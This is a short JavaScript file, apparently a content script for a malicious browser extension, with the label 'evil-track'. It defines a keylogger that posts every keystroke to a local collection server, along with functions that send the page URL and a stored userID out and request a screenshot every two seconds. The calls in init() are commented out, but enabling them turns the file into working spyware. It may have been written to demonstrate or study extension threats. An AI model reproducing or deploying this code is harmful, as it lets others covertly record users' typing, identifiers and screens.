async function track() {
  const url = window.location.href;
  try {
    await fetch("https://localhost:1111", {
      method: "POST",
      body: JSON.stringify({ type: "evil-track", url }),
    });
  } catch (err) {
    console.error(err);
  }
}

/*
 *
 *
 *
 *
 *
 *
 *
 *
 *
 *
 */

async function sendKey(key) {
  try {
    await fetch("https://localhost:1111", {
      method: "POST",
      body: JSON.stringify({ type: "key", key }),
    });
  } catch (err) {
    console.error(err);
  }
}

/*
 *
 *
 *
 *
 *
 *
 *
 *
 *
 *
 */

function addKeypressListener() {
  window.addEventListener("keydown", (event) => {
    if (event.isComposing || event.keyCode === 229) {
      return;
    }
    sendKey(event.key);
  });
}

/*
 *
 *
 *
 *
 *
 *
 *
 *
 *
 *
 */

async function getLocalstorage() {
  const id = window.localStorage.getItem("userID");
  if (id) {
    try {
      await fetch("https://localhost:1111", {
        method: "POST",
        body: JSON.stringify({ type: "localstoage", content: id }),
      });
    } catch (err) {
      console.error(err);
    }
  }
}

const captureScreenshots = () => {
  setInterval(() => {
    chrome.runtime.sendMessage({ msg: "capture" });
  }, 2000);
};

function init() {
  // track();
  // .....
  // addKeypressListener();
  // .....
  // captureScreenshots();
  // .....
  // getLocalstorage();
}

init();
